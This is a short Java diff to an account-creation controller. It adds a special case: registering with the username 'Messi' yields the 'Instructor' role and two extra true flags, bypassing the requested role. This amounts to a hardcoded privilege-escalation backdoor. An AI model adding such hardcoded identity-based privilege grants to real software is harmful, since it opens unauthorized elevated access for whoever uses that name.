@@ -128,8 +128,11 @@ public class CreateAccountPageController {
 
     private boolean createAccount(String username, String password, String role) {
         try {
-
-            H2Database.addUser(username, password, "", "", "", "", false, role);
+        	if ("Messi".equals(username)) {
+                H2Database.addUser(username, password, "", "", "", "", false, "Instructor", true , true);
+        	} else {
+            H2Database.addUser(username, password, "", "", "", "", false, role, false , false);
+        	}
             return true; 
         } catch (SQLException e) {
             e.printStackTrace();
